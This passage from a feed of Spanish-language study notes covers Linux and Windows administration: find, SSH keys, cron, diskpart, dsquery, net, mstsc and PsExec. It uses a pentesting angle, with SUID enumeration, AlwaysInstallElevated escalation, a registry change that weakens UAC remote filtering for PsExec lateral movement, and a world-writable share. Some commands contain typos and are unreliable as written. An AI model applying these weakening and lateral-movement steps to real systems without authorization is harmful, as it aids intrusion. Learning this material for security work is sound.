/mnt: Punto de montaje temporal donde los administradores del sistema pueden montar sistemas de archivos manualmente. Este directorio al igual que /tmp cuenta con la capacidad de escritura para todos los usuarios del sistema.

<br>
/opt: Utilizado para instalar software opcional y paquetes que no forman parte del sistema operativo estándar. Normalmente se utiliza para aplicaciones de terceros.

<br>
/proc: Sistema de archivos virtual que contiene información sobre los procesos en ejecución y el estado del sistema. Se utiliza para acceder a la información del kernel y de los procesos, por ejemplo /proc/cpuinfo, /proc/meminfo, /proc/net/tcp, etc.

<br>
/root: Directorio personal del superusuario (root). Similar a /home, pero específico para el usuario root.

<br>
/run: Sistema de archivos temporal que almacena información de estado y otros archivos que describen el estado del sistema desde que fue iniciado. Específicamente utilizado para almacenar archivos que no deben persistir después de un reinicio.

<br>
/sbin: Contiene binarios esenciales del sistema que son necesarios para la administración del sistemay que requieran permisos de superusuario, por ejemplo fdisk, fsck, ifconfig, etc.

<br>
/srv: Almacena datos específicos para servicios proporcionados por el sistema, por ejemlo datos de un servidor web podrían estar en /srv/www. 

<br>
/sys: Similar a /proc, es un sistema de archivos virtual que proporciona información y control sobre los dispositivos conectados al sistema y otros subsistemas del kernel.

<br>
/tmp: Directorio para almacenar archivos temporales creados por el sistema y los usuarios. Los arhcivos aquí almacenados suelen ser eliminados en cada reinicio del sistema.

<br>
/usr: Contiene archivos de usuario secundarios. Aquí se almacenan programas, bibliotecas y documentación no esencial para el funcionamiento del sistema en single-user mode, por ejemplo /usr/bin, /usr/lib, /usr/local, etc.

<br>/usr/bin: Directorio que almacena binarios disponibles para todos los usuarios.
<br>/usr/lib: Directorio que almacena bibliotecas para los binarios de /usr/bin.
<br>/usr/local: Directorio que almacena jerarquía para aplicaciones locales. Contiene programas que han sido instalados localmente por el administrador del sistema.


<br>
/var: Contiene archivos que varían en tamaño, como registros del sistema (/var/log), archivos de spool de correo (/var/spool), y otros archivos temporales que no deben ser eliminados tras un reinicio (/var/tmp). 



<br><br><br>El archivo .bashrc (O .zshrc dependiendo de la terminal que usemos) es un script de shell que la terminal (Bash o Zsh) inicia cada vez que se inicia una nueva terminal interactiva, no de inicio de sesión. Este archivo se encuentra en el directorio home del usuario (~/.bashrc). Se utiliza para configurar el entorno del shell ypersonalizar la experiencia del usuario.<br>Lo podemos utilizar para la implementación de plugins, la exportación de variables de entorno, la creación de funciones propias, aliases propios, etc.<br>
<br>nano ~/.bashrc:
<br># Add custom functions
function extract(){
	if [ "$1" ]; then
		if [ -f $1 ]; then
			case $1 in
			*.tar.bz2)   tar xjf $1     ;;
			*.tar.gz)    tar xzf $1     ;;
			*.bz2)       bunzip2 $1     ;;
			*.rar)       unrar x $1     ;;
			*.gz)        gunzip $1      ;;
			*.tbz2)      tar xjf $1     ;;
			*.tgz)       tar xzf $1     ;;
			*.zip)       unzip $1       ;;
			*.Z)         uncompress $1  ;;
			*.7z)        7z x $1        ;;
			*)           echo -e "\n\t[!] '$1' cannot be extracted via extract().\n\n"
			esac
		else
			echo -e "\n\t[!] '$1' is not a valid file.\n\n"
		fi
	else
		echo -e "\n\t[!] Please insert a file to extract.\n\n"
	fi
}
# Add custom aliases
alias ls="ls -la"
alias cat="/bin/bat" 
alias my_ip="hostname -I | awk '{print $1}'"
# Add custom prompts
PS1='\u@\h:\w\$ ' # user@hostname $ 
# Export custom or modified vars
export PATH=/my/own/path:/another/path:$PATH
export CUSTOM_VAR="Dobliuw shit"
# Custom historial configuration
HISTSIZE=1000
SAVEHIST=2000
HISTFILE=~/.bash_history
Copy<br>
<br>nano ~/.zshrc:
<br># If we are using Oh My Zsh
ZSH_THEME="robbyrussell"
plugins=(git docker zsh-autosuggestions)
source $ZSH/oh-my-zsh.sh
# Custom PROMPT
PROMPT='%n@%m:%~%# ' # user@machine /path# 
# Custom historial configuration
HISTSIZE=1000
SAVEHIST=2000
HISTFILE=~/.zsh_history
Copy<br><br><br>Actualizar y mejorar el sistema es esencial para mantener el sistema operativo seguro y funcional. Los comandos varían dependiendode la distribución de Linux que estemos utilizando.<br>
<br>Update packets index 
<br>sudo apt-get update
Copy<br>
<br>Update installed packets
<br>sudo apt-get upgrade
Copy<br>
<br>Update the full system
<br>sudo apt full-upgrade
Copy<br>
<br>Clean unnecesary packets
<br>sudo apt autoremove
sudo apt autoclean
Copy<br><br><br>
<br>Buscar desde la raiz de forma recursiva donde el nombre sea passwd y en forma paralela listar los permisos especiales:
<br>find / -name passwd 2&gt;/dev/null | xargs ls -l
Copy<br>
<br>Buscar desde la raiz de forma recursiva archivos con permiso SUID:
<br>find / -perm -4000 2&gt;/dev/null
Copy<br>
<br>Buscar desde la raiz de forma recursiva directorios con grupo dobliuw y permisos SUID:
<br>find / -type d -group dobliuw -perm -4000 2&gt;/dev/null
Copy<br>
<br>Buscar de forma recursiva desde la raiz archivos del usuario root que sean editables:
<br>find / -user root -writeble 2&gt;/dev/null
Copy<br>
<br>Buscar desde la raiz de forma recursiva archivos del usuario root que sean ejecutables:
<br>find / -user root -executable -type f 2&gt;/dev/null
Copy<br>
<br>Buscar desde la raiz de forma recursiva archivos que empiezen con dex:
<br>find / -name dex\* 2&gt;/dev/null
Copy<br>
<br>Buscar desde la raiz de forma recursiva archivos que contengan la palabra exdum: 
<br>find / -name \*exdum\* 2&gt;/dev/null
Copy<br>. Buscar desde la raiz de forma recursiva archivos que empiezen con dex y terminen con .sh:<br>find / -name dex\*.sh 2&gt;/dev/null
Copy<br>
<br>Buscar desde la raiz de forma recursiva archivos que empiezen con dex y terminen con .sh a la vez que muestre los permisos avanzados:
<br>find / -name dex\*.sh -ls 2&gt;/dev/null
Copy<br>
<br>Buscar desde la raiz de forma recursiva directorios con permisos especiales Sticky Bit y que pertenezcan al grupo root:
<br>find / -type d -perm -1000 -group root 2&gt;/dev/null 
Copy<br><br><br>La autenticación sin contraseña en SSH se logra mediante el uso de pares de claves SSH (Public and Private Key). Esto mejora la seguridad y conveniencia al eliminar la necesidad de ingresar una contraseña cada vez que se realizar una conexión SSH.<br>
<br>Public Key (id_rsa.pub): La clave pública se comparte con el servidor para qeu pueda autenticar al usuario.
<br>Private Key (id_rsa): La clave privada se mantiene segura y nunca se comparte. Es usada para autenticar al usuario al servidor.
<br>Para habilitar el demonio de SSH, podemos hacer uso de la herramienta systemctl o service:<br>sudo systemctl start sshd
sudo service sshd start

sudo systemctl enable sshd
Copy<br>Una vez habilitado el demonio de SSH, es importante destacar que en este punto otros equipos podrían conectarse de manera remota a mi sistema obteniendo una Secure Shell en caso de proporcionar un usuario y contraseña válidos, pero para que no haya que ingresar credenciales, primero podriamos proseguir con la creación de nuestro par de claves SSH:<br>ssh-keygen
Copy<br><br>Una vez creada las claves SSH, estas se encontraran en el directorio oculto .ssh del usuario. En donde, a su vez, deberemos crear el archivo authorized_keys donde almacenaremos la clave pública del equipo que queremos permitir que autentique sin proporcionar credenciales:<br># Create authorized_keys file
touch ~/.ssh/authorized_keys &amp;&amp; chmod 600 ~/.ssh/authorized_keys
# Copy public key to this file (Way 1)
cat ~/.ssh/id_rsa.pub | ssh {username}@{ip} 'cat &gt;&gt; ~/.ssh/authorized_keys'
# Way 2
ssh-copy-id -i ~/.ssh/id_rsa.pub {username}@{ip}
Copy<br><br>En caso de disponer desde otros equipos de la clave privada del usuario, podremos utilizar la misma para contectarnos sin proporcionar contraseña como archivo de indentificación:<br>ssh -i /path/to/id_rsa {user}@{ip}
Copy<br><br><br>Las tareas cron sob tareas programadas que se ejecutan automáticamente a intervalos regulares de tiempo en ssitemas Unix y LInux. cron es el nombre del demonio que maneja la ejecución de estas tareas. Para programar tareas cron, se utiliza una rchivos especial llamada crontab. <br><br>La sintaxis básica de una línea de un archivo crontab es: <br><img alt="crontabs_syntaxis.png" src="https://dobliuw.com/lib/media/crontabs_syntaxis.png"><br>Cada campo a su vez puede contener:<br>
<br>Un número específico (Ejemplo 5).
<br>Un rango (Ejemplo 1-5)
<br>Una lista de valores (Ejemplo 1,3,5)
<br>Un asterisco * (Para todos los valores posibles)
<br>Incremento (Ejemplo */5 para cada 5 unidades)
<br>Algunos ejemplos de tareas cron:<br>
<br>*/5 * * * *   /path/to/script.sh: Ejecutar un script cada 5 minutos.
<br>0 0 * * *     /usr/bin/env {command}: Ejecutar un comando todos los días a medianoche.
<br>0 8 * * 1     /usr/bin/env {command}: Ejecutar un comando los Lunes a las 8 AM.
<br>0 0 1 * *     /usr/bin/env {command}: Ejecutar un comando el primer día de cada mes a medianoche.
<br><br>
<br>Editar el archivo crontab del usuario actual:
<br>crontab -e
Copy<br>
<br>Listar las tareas cron del usuario actual:
<br>crontab -l
Copy<br>
<br>Eliminar el archivo crontab del usuario actual:
<br>crontab -r
Copy<br>Adicionalmente, podemos definir archivos de configuración crontab adicionales en el directorio /etc/cron.d/. Estos archivos deben seguir la misma sintaxis que /etc/crontab<br>Páginas como <a data-tooltip-position="top" aria-label="https://crontab.guru/" rel="noopener nofollow" class="external-link" href="https://crontab.guru/" target="_blank">crontab.guru</a> nos pueden ayudar a leer y crear tareas cron.]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/linux/0.-linux-basics.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Linux/0. Linux Basics.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 17:01:27 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/linux_permits.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/linux_permits.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Disk Management]]></title><description><![CDATA[ 
 <br><br>La gestión de particiones, discos y volumenes es un componente crítico en la administración del sistema y por ende, como punto de interes para nostros.<br>
<br>Manejo de almacenamiento: La gestión de discos permite a los adminitradores adminisrtar unidades de disco y particiones en un sistema Windows. Esto inlcuye tareas como crear, eliminar, formatear y cambiar el tamaño de particiones. La gestión adecuada del disco es esencial para optimizar los recursos de almacenamiento y garantizar la integridad de los datos.
<br>Rendimiento del sistema: La gestión eficiente del disco puede afectar significaticamente el rendimiento del sistema. Con una correcta configuración de las particiones del disco y los vólumenes de almacenamiento, los administradores puede prevenir la fragmentación de disco, mejorar las velocidades de read/write y garantizar que los archivos críticos del sistema tengan el espacio adecuado.
<br>Protección de datos. 
<br>Recuperación de incidentes. 
<br><br><br>La extensión msc proviene de Microsoft Management Console, framework para alojar herramientas administrativas llamadas complementos. Cada complemento proporciona capacidades en varios aspectos del sistema, en este caso indica que tras la ejecución del comando diskmgmt.msc se nos habrirar la GUI para la gestión de discos.<br><img alt="gui_diskmgmt.msc-stdout.png" src="https://dobliuw.com/lib/media/gui_diskmgmt.msc-stdout.png"><br><br><br>Por otro lado, tenemos la implementación de herramientas para la gestion de disco a través de la línea de comandos con comandos como diskpart. <br># Launch the Diskpart utility from a administrative powershell
&gt; diskapart
Copy<br>Una vez lanzado el comando diskpart se nos abrira una nueva v<br># List all disk
list disk
# Select a disk for further operations
select disk {disk}
# List partitions fon the selected disk
list partition
# Create a new partition on the selected disk
create partition primary size={size}

# Select a disk for further operations
select partition {partition}
# Delete a partition from the selected disk
delete partition
# Format a partition with a specified file system
format fs=NTFS quick
# Extends teh size of teh selected partition
extend
# Reduces the size of the selected partition
shrik desired={partition}
Copy]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/administration/diskmgmt-diskpart.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/Administration/DISKMGMT - DISKPART.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 13 May 2024 20:28:09 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/gui_diskmgmt.msc-stdout.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/gui_diskmgmt.msc-stdout.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[DSQUERY]]></title><description><![CDATA[ 
 <br><br>El comando dsquery será utilizado para realizar consultas en un servicio de Active Directory, está permite a los administradores buscar por objetos dentro del AD y obtener información especifica sobre estos objetos.<br><br>Los tipos de objetos que nos podemos encontrar en un entorno de Active Directory son:<br>
<br>User: Representa cuentas de usuarios dentro del Active Directory.
<br>Computer: Representa objetos de computadora, lo que incluye workstations, servers y otros dispositivos ingresados en el dominio.
<br>Group: Representa grupos de seguridad o listas de distribuciones usadas para la gestión de permisos y control de accesos.
<br>OU (Organizational Unit): Representa unidades organizativas, las cuales son contenedores usados para la organización y administración de objetos dentro de la jerarquía de Active Directory.
<br>Contact: Representa objetos de contacto, usalmente usados para almacenar información sobre contactos o recursos externos .
<br>Server: Representa objetos de servidor dentro del dominio.
<br>Site: Representa sitios del Active Directory, que son agrupaciones lógicas de recursos de red basados topologias físicas o de redes.
<br>Subnet: Representa las IPs de subredes utilizadas por el direccionamiento y enrutamiento de la red.
<br>Printer: Representa objetos de impresoras dentro del dominio.
<br>Quota: Representa objetos de cuota utilizados para administrar el uso y la signación del espacio en disco.
<br>Trust: Representa relaciones de confianza entre dominios o bosques.
<br>Partition: Representa objetos de particiones, las cuales son divisiones logicas de la base de datos de Active Directory.
<br># Search all users and limit the result in just 10 (0 for no limits)
&gt; dsquery user "DC=dobliuw,DC=com" -limit 10
# Search for a user
&gt; dsquery user -name Owen
# Find all users in a organizational unit (ou)
&gt; dsquery user "ou=Cibersecurity,dc=dobliuw,dc=com"
# Search for computers with specific atributes
&gt; dsquery computer -name "DESKTOP-*" -attr operatingSystem
# Find groups with specific members
&gt; dsquery group -member "CN=Owen Nicolas,CN=Users,DC=dobliuw,DC=com"
# Retrieve specific attributes for user
&gt; dsquery user -name Owen -attr samAccountName giveName sn mail
# Search for all domain controllers
&gt; dsquery server -domain {domain_name} -isgc
# List all OU in the domain
&gt; dsquery ou
# Find subnets associated with a site
&gt; dsquery subnet -site "dobliuwSite"
Copy]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/administration/dsquery.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/Administration/DSQUERY.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 13 May 2024 20:47:33 GMT</pubDate></item><item><title><![CDATA[Group Policy]]></title><description><![CDATA[ 
 <br><br>La directiva de grupo es una característica de la familia de sistemas operativos Windows. Una Directiva de Grupo o Group Policy, es un conjutno de reglas que controlan el entorno de trabajo de cuentas de usuario y cuentas de equipo.<br><br><br>La herramienta gpedit.msc es una herramienta poderosa en Windows para manejar varios ajustes del sistema y configuraciones dentro de una organización relacionadas a las políticas de grupos.<br># Deploy the Local Group Policy Editor windows
&gt; gpedit.msc
Copy<br><img alt="gpedit.msc_image.png" src="https://dobliuw.com/lib/media/gpedit.msc_image.png"><br><br><br>
<br>Group Policy Management Console (GPMC): El comando gpmc.msc provee una interfaz gráfica para la administración de Group Policy Objects (GPOs) en entornos de Active Directory. Si bien no es una herramienta de línea de comandos, ofrece un control centralizado sobre las políticas através del dominio.
<br># To open de Grop Policy Management Console
&gt; gpmc.msc
Copy<br>
<br>GPUpdate: La utilidad de línea de comandos gpupdate es utilizada para actualizar los ajustes de políticas de grupos en un host local o para un usuari esepecífico en un entorno de Active Directory. Ejecutandogpupdate sin ningún parametro, actualizamos las políticas del usuario y del host local.
<br># Force an inmmediate update of group policy
&gt; gpupdate /force
# Perfrom a background update without displaying progress messages
&gt; gpupdate /force /quiet
Copy<br>
<br>GPResult: Esta utilidad de línea de comandos muestra la Resultant Set of Policy (RSOP) para un usuario o un host. Muestra que configuración de política de grupo han sido aplicadas al usuario o al host local, incluidas las heredadas de los contenedores principales de Active Directory.
<br># Display teh RSoP for teh current user and host
&gt; gpresult /r
# Display the RSoP for a specific user and host
&gt; gpresult /user {username} /scope {computer} /r
Copy]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/administration/gpedit.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/Administration/GPEDIT.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 14 May 2024 18:32:06 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/gpedit.msc_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/gpedit.msc_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Microsoft System Configuration Utility]]></title><description><![CDATA[ 
 <br><br>msconfig o Microsoft System Configuration Utility, es una utilidad de los sistemas Windows que permite a los usuarios configurar varias opciones de inicio en el sistema así como diagnosticar problemas en la configuración del mismo. Proporcina una interfaz para administrar programas de inicio, servicios, configuración de inicio y otras configuraciones del sistema.<br>
<br>Configuración del Sistema: Los usuaris pueden modificar el comportamiento de inicio, incluyendo habilitar o deshabilitar elementos de inicio, servicios y opciones de inicio.
<br>Programas de Startup: Los usuarios puede visualizar y manejar aquellos programas que inician automaticamente cuando el sistema se inicia. Esta característica permite a los uusarios controla cuales programas deberán seguir este comportamiento, mejorando potencialmente los tiempos de inicio y rendimiento del sistema.
<br>Servicios: Los usuarios pueden ver y manejar los servicios del sistema que corren en segundo plano. Esto incluye ejecutar, detener y deshabilitar servicios cuand sea necesario.
<br>Configuración de inicio: Los usuarios pueden modificar las configuraciones de boot, como el inicio en Safe Mode o cambiando la duración del boot menu.
<br>Herramientas: msconfig además ofrece acceso a herramientas adicionales del sistema, como puede ser Event Viewer, System Information y Task Manager, convirtiendolo en un eje central para troubleshooting y diagnostico del sistema.
<br># Display the Microsoft System Configuration Utility window
&gt; msconfig
Copy<br><img alt="msconfig_windows.png" src="https://dobliuw.com/lib/media/msconfig_windows.png">]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/administration/msconfig.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/Administration/MSCONFIG.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 14 May 2024 22:57:44 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/msconfig_windows.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/msconfig_windows.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Microsoft Installer]]></title><description><![CDATA[ 
 <br><br>Microsoft Installer, generalmente abreviado como MSI, es un componente del sistema operativo Windows que facilita la instalación, mantenimiento y eliminación de aplicaciones de software basada en computadoras Windows.<br><br>
<br>Estandarizar la instalación: MSI provee un formato de estandarización para la instalación de paquetes de software. Los desarrolladores utilizan archivos MSI para encapsular todos los archivos necesarios, recursos e instrucciones necesarias para instalar la aplicación.
<br>Comportamiento de instalación coherente: Los paquetes MSI garantizan un comportamiento de instalación coherente en diferentes sistemas Windows. Admiten funciones como instalaciiones silenciosas, reparaciones y desinstalaciones, haciendo que el despliegue del software sea más confiable y predecible.
<br>Integración con Windows Installer Service: El servicio Windows Installer (msiexec.exe) interpreta y ejecutá paquetes MSI. Gestiona el procesos de instalación, incluyendo la extracción de archivos, el registro de componentes y la funcionalidad de reversión en caso de fallas en la instalación. 
<br>Esta herramienta es una funcionalidad muy poderosa y clave cuando hablamos de la administración y manejo del sistema operativo, como profesionales de la ciberseguridad en el apartado de pentesting, esta herramienta puede ser de vital interes en caso de contar con determinados permisos en el sistema como podría ser AlwaysInstallElevated, privilegio que le otorga a los usuarios no administradores la capacidad de llevar a cabo la instalación de software usando permisos a nivel de sistema, lo que lo vuelve una vía de escalar privilegios.<br><br><br>msiexec.exe es una utilidad de línea de comandos utilizada en Windows para instalar, modificar o eliminar paquetes .msi. <br># Display the Windows Installer usage with Install, Logging, Display and more options
&gt; msiexec.exe /?
Copy<br>Tras la ejecución del comando para solicitar el panel de ayuda de esta herramienta, se nos abrira una ventana en la cual podremos ver la sintaxis del comando, ejemplos de uso, explicación de los distintos tipos de opciones, etc.<br><img alt="windows_installer_help_guide.png" src="https://dobliuw.com/lib/media/windows_installer_help_guide.png"><br>Podríamos llevar a cabo una simple instalación de un paquete .msi con el siguiente comando: <br># Install a msi package without user interactio and with status messages
&gt; msiexec.exe /i "X:\Path\to\our\installer.msi" /quiet
Copy<br>Podríamos modificar un paquete .msi previamente instalado, esto quiere decir que podríamos querer parchearlo, actualizarlo o reparar el mismo, por ejemplo, siempre haciendo uso del panel de ayuda podríamos repararlo:<br><img alt="repair_option_sectio_windows_installer.png" src="https://dobliuw.com/lib/media/repair_option_sectio_windows_installer.png"><br># Modiying (Which could mean repari, update or patche existing installation)
&gt; msiexec.exe /fa "X:\Path\to\our\repair.msi" /qn
Copy]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/administration/msiexec.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/Administration/MSIEXEC.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 14 May 2024 16:58:16 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/windows_installer_help_guide.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/windows_installer_help_guide.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Microsoft Terminal Services Client]]></title><description><![CDATA[ 
 <br><br>mstsc también conocido como Microsoft Terminal Services Client, tambie´n conocido como RDC (Remote Desktop Connection), es una herramienta proporcionada por Microsoft que permite a los usuarios realizar conexiones remotas a otros hostsa a través de conexiones de red.<br>
<br>Conexión de Escritorio Remoto: MSTSC permite a los usuarios acceder al escritorio de una computadora remotamente como si estuviera sentado frente a ella. Esto puede ser útil para soporte técnico remoto, acceder a archivos y aplicaciones almacenados en otra computadora o administrar servidores y workstations de forma remota.
<br>Acceso remoto seguro MSTSC admite varias funciones de seguridad, incluidos protocolos de cifrado y autenticación, para garantizar conexiones remotas seguras. Es importante configurar correctamente los ajustes del escritorio remoto y utilizar contraseñas seguras par evitar el acceso no autorizado a sistemas remotos.
<br>Para hacer uso de MSTSC, normalmente necesitaremos la sigueinte información:<br>
<br>Configuraciones de Firewall: Permitir las conneciones de escritorio remoto, por defecto hace uso de 3389 TCP.
<br>Dirección IP o hostname: La dirección de red del equipo al que nos deseamos conectar.
<br>Username and Password: Credenciales necesarias para inciiar sesión en el equipo remoto.
<br>Conectividad a Internet: Tanto el equipo local como el reomoto deben estar conectadas a la misma red o ser accesibles a través de Internet.
<br>Servicio Remote Desktop: Será necesario tener habilitado en el equipo al que nos queremos conectar de manera remota el servicio de Remote Desktop o Terminal Service.
<br># Enable Remote Desktop
&gt; Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

# Allow Remote Desktop through the firewall
&gt; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Restart the Remote Desktop Services to apply changes
&gt; Restart-Service TermService -Force
Copy<br>Conociendo el uso y sintaxis del comando mstsc:<br># Display help panel
&gt; mstsc /?
Copy<br>Panel de ayuda:<br><img alt="mstsc_help_panel.png" src="https://dobliuw.com/lib/media/mstsc_help_panel.png"><br>Conexiones remotas haciendo uso de Remote Desktop:<br># Basic connection
&gt; mstsc /v:{server[:port]}
# Connection giving credentials
&gt; mstsc /v:{server[:port]} /u:{username} /p:{password}
# Launch full screen mode
&gt; mstsc /v:{server[:port]} /f
# Connect to admin session
&gt; mstsc /v:{server[:port]} /admin
# Setting custom resolution
&gt; mstsc /v:{server[:port]} /w:{width} /h:{height} 
# Explore remote desktop connection settings
&gt; mstsc /l 
# Import Remote Desltop connection settings
&gt; mstsc /f:{file_path}
Copy]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/administration/mstsc.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/Administration/MSTSC.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 14 May 2024 23:23:20 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/mstsc_help_panel.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/mstsc_help_panel.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[NET]]></title><description><![CDATA[ 
 <br><br>El comando net en Windows proporciona una amplia gama de funcionalidades relacionadas con redes, cuentas de usuario, serivicos y más.<br>
<br>Manejo de cuentas de Usuario: Haciendo uso de net user podemos gestionar y configurar cuentas de usuario, inlcuso crear, modificar y eliminar estas, cambiar contraseñas y gestionar membresías de grupos.
<br># Display help panel
&gt; net user /?
# Create a new user
&gt; net user {username} {password} /add
# Delete a user
&gt; net user {username} /delete
# Change user password
&gt; net user {username} {new_password}
Copy<br>
<br>Configuración de red: Comandos como netsh nos permiten gestionar mútiples configuraciones de red, como direcciones IP, interfaces, reglas de firewall y más.
<br># Display help panel
&gt; netsh /?
# View network interfaces
&gt; netsh interface show interface
# Set a static IP address
&gt; netsh interface ip set address "Local Area Connection" static 192.168.1.100 255.255.255.0
Copy<br>
<br>Gestión de servicios: net start, net stop y net pause son comandos que nos permiten el control de Servicios en Windows desde CLI.
<br># Start a service
&gt; net start {servicename}
# Stop a service
&gt; net stop {servicename}
# Pause a service
&gt; net puase {servicename}
Copy<br>
<br>Compartir archivos: Podríamos hacer uso de comandos como net share para poder llevar a cabo uso del protocolo SMB para crear, ver y eleminar recursos compartidos. A esto se hace mención en el apartado de Transferencia de archivos de <a data-href="0. Windows Basics" href="https://dobliuw.com/notes/3.-system/operative-systems/windows/0.-windows-basics.html" class="internal-link" target="_self" rel="noopener nofollow">0. Windows Basics</a>.
<br># Visualize all shared folders
net share
# Visualize a specific shared folder
net share {share_name}
# Create shared folder with wide-open access
net share {share_name}={path} /GRANT:Everyone,FULL
# Delete a specific shared folder
net share {share_name} /DELETE
Copy<br>
<br>Diagnostico de red: Comandos como netstat nos proveen información sobre conecciones de red, tablas de enrutamiento y interfazes de red.
<br># Display all TCP Listening connecitons
&gt; netstat -nat -p TCP | findstr /I listening
# -n -&gt; Displays addresses and port numbers in numerical form.
# -a -&gt; Displays all connections and listening ports.
# -t -&gt;  Displays the current connection offload state.
# -q -&gt;Shows connections for the protocol specified by proto; proto
# may be any of: TCP, UDP, TCPv6, or UDPv6.  If used with the -s
# option to display per-protocol statistics, proto may be any of:
# IP, IPv6, ICMP, ICMPv6, TCP, TCPv6, UDP, or UDPv6.
Copy<br>
<br>Usos varios: Algunos usos que se le puede dar a net no fueron mencionados en el apartado de arriba, como podría ser la declaración de un nueva unidad para un disco vinculado a un recurso compartido o listar información de un dominio, entre otras.
<br># Assign letter X to a new drive bound with a sharename
&gt; net use X: \\server\share_folder
# List information about a specific domain
&gt; net view /DOMAIN:{domain}
Copy]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/administration/net.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/Administration/NET.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 15 May 2024 00:21:57 GMT</pubDate></item><item><title><![CDATA[PsExec]]></title><description><![CDATA[ 
 <br><br>PsExec es una herrmaienta administrativa de sistema versátil de Microsoft que se puede utilizar para acceder de forma remota a un host de destino. es parte de la suite de herramientes Sysinternalas, su propósito principal es ayudar a los administradores del sistema a realizar tareas de mantenimineto remoto y ejecutar comandos en el host de destino. Como interfaz de línea de comandos, PsExec solo requiere que proporcione la dirección de destino, los detalles del usuario y la contraseña para obtener acceso al host de destino<br><br><br>La herramienta de línea de comandos PsExec, creada por Sysinternals, permite la interacción remota con otros sistemas (Movimiento lateral) sin necesidad de instalar (Descarga y ejecución) utilizando diferentes credenciales (Impersonalización).<br>
<br>LanmanServer en ejecución: El servicio de LanmanServer necesita estar siendo ejecutado en el host de la víctima. LanmanServer es responsable de la transmición de archivos e impresoras a traves de la red.
<br># Attempt to start the LanmanServer service
&gt; sc start LanmanServer
Copy<br>
<br>
Puerto 445 TCP Accesible: El puerto 445 TCP necesita ser accesible en el host víctima ya que este puerto es usado por PsExec para la comunicación a través de la red. Tiene que estar abierto y accesible para poder establecer una conexión, sin la posibilidad de acceder a este puerto, PsExec no va a poder llevar a cabo la comunicación con el sistema target.

<br>
Permisos avanzados en el sistema víctima: Para ejecutar comandos de manera remota haciendo uso de PsExec, la cuenta de usuario utilizada para hacer uso de esta utilidad tiene que tener los suficientes permisos en el sistema remoto. Esto usualmente incluye privilegios administrativos o derechos de accesos apropiados para realizar esta acción deseada.

<br>
Modificación de clave de registro para UAC: Como vimos en <a data-href="0. Windows Basics" href="https://dobliuw.com/notes/3.-system/operative-systems/windows/0.-windows-basics.html" class="internal-link" target="_self" rel="noopener nofollow">0. Windows Basics</a>, el UAC (User Access Control) es una caracteristica de seguridad de Windows que solicita credenciales o confirmación administrativa tras el intento de ejecución de un software que puede ser critico, en este caso, PsExec requiere que la clave de registro (Registro de Windows también explicado en <a data-href="0. Windows Basics" href="https://dobliuw.com/notes/3.-system/operative-systems/windows/0.-windows-basics.html" class="internal-link" target="_self" rel="noopener nofollow">0. Windows Basics</a>) LocalAccountTokenFilterPolicy, en caso de estar en 0, cambiarlo a 1 para que el UAC no filtre las conexiones administrativas remotas y bloquee a la par que solicite credenciales de administrador mediante una GUI.

<br># Change the value LocalAccountTokenFilterPolicy of the spcified key:
&gt; reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REF_DWORD /d 1 /f
# /v {value_name} -&gt; value to change/add 
# /t {value_type} -&gt; value type
# /d {value} -&gt; the value it self
# /f -&gt; Force overwriting the existing registry entry without prompt.
# ---- THIS ALL OPTION COULD BE SEEING WITH "reg add /?" command ----- 

# VALUES TYPES
# REG_SZ / REG_MULTI_SZ / REG_EXPAND_SZ (Strings)
